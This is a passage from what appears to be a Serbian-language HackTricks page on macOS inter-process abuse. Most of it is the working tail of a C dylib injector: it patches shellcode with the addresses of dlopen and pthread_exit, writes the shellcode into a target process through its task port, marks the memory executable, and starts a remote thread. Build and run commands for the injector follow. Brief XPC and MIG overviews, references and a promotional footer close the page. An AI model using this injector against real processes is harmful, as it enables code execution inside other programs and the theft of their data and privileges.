uint64_t addrOfPthreadExit = dlsym (RTLD_DEFAULT, "pthread_exit"); //(uint64_t) pthread_exit;
uint64_t addrOfDlopen = (uint64_t) dlopen;

if (memcmp (possiblePatchLocation, "PTHRDEXT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadExit,8);
printf ("Pthread exit  @%llx, %llx\n", addrOfPthreadExit, pthread_exit);
}

if (memcmp (possiblePatchLocation, "PTHRDCRT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadCreate,8);
printf ("Pthread create from mach thread @%llx\n", addrOfPthreadCreate);
}

if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
{
printf ("DLOpen @%llx\n", addrOfDlopen);
memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
}

if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
{
strcpy(possiblePatchLocation, lib );
}
}

// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
```c
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Nije moguće postaviti dozvole memorije za kod udaljenog niti: Greška %s\n", mach_error_string(kr));
return (-4);
}

// Postavljanje dozvola na alociranu memoriju steka
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Nije moguće postaviti dozvole memorije za stek udaljene niti: Greška %s\n", mach_error_string(kr));
return (-4);
}


// Kreiranje niti za izvršavanje shell koda
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // ovo je pravi stek
//remoteStack64 -= 8;  // potrebno je poravnanje od 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Udaljeni stek 64  0x%llx, Udaljeni kod je %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Nije moguće kreirati udaljenu nit: greška %s", mach_error_string (kr));
return (-3);
}

return (0);
}



int main(int argc, const char * argv[])
{
if (argc < 3)
{
fprintf (stderr, "Upotreba: %s _pid_ _akcija_\n", argv[0]);
fprintf (stderr, "   _akcija_: putanja do dylib fajla na disku\n");
exit(0);
}

pid_t pid = atoi(argv[1]);
const char *action = argv[2];
struct stat buf;

int rc = stat (action, &buf);
if (rc == 0) inject(pid,action);
else
{
fprintf(stderr,"Dylib nije pronađen\n");
}

}
```
</detalji>
```bash
gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
./inject <pid-of-mysleep> </path/to/lib.dylib>
```
### Preusmeravanje niti putem Task porta <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>

U ovoj tehnici se preusmerava nit procesa:

{% content-ref url="../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-thread-injection-via-task-port.md" %}
[macos-thread-injection-via-task-port.md](../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-thread-injection-via-task-port.md)
{% endcontent-ref %}

## XPC

### Osnovne informacije

XPC, što označava XNU (jezgro koje koristi macOS) međuprocesnu komunikaciju, je okvir za **komunikaciju između procesa** na macOS-u i iOS-u. XPC pruža mehanizam za obavljanje **sigurnih, asinhronih poziva metoda između različitih procesa** na sistemu. To je deo Apple-ovog sigurnosnog paradigma, omogućavajući **kreiranje aplikacija sa razdvojenim privilegijama** gde svaki **komponenta** radi sa **samo dozvolama koje su mu potrebne** da obavi svoj posao, čime se ograničava potencijalna šteta od kompromitovanog procesa.

Za više informacija o tome kako ova **komunikacija funkcioniše** i kako **može biti ranjiva**, pogledajte:

{% content-ref url="../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/" %}
[macos-xpc](../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/)
{% endcontent-ref %}

## MIG - Generator Mach interfejsa

MIG je kreiran da **simplifikuje proces kreiranja koda Mach IPC**. U osnovi, **generiše potreban kod** za server i klijenta da komuniciraju sa datom definicijom. Čak i ako je generisani kod ružan, programer će samo trebati da ga uveze i njegov kod će biti mnogo jednostavniji nego pre.

Za više informacija pogledajte:

{% content-ref url="../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-mig-mach-interface-generator.md" %}
[macos-mig-mach-interface-generator.md](../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-mig-mach-interface-generator.md)
{% endcontent-ref %}

## Reference

* [https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)
* [https://knight.sc/malware/2019/03/15/code-injection-on-macos.html](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
* [https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a](https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a)
* [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
* [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** Proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
